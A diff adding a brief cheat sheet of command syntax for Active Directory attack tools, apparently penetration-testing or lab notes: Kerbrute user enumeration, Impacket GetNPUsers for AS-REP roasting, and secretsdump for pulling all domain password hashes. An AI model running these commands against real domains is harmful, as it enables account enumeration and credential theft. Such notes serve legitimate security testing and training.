@@ -1,0 +1,17 @@
+# Syntax for tools in Impacket (Kerbrute, GetNPUsers, secretsdump)
+
+# Kerbrute
+
+ ./kerbrute userenum --dc <dc_ip> -d <domain_name> <user_list>
+
+
+# GetNPUsers
+
+  python3 GetNPUsers.py -dc-ip <dc_ip> <domain_name>/<username> -no-pass  # ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
+
+
+# secretsdump
+
+sudo python3 secretsdump.py -just-dc <username>:<password>@<ip> # retrieve all of the password hashes if account has correct permissions
+ 
+ 
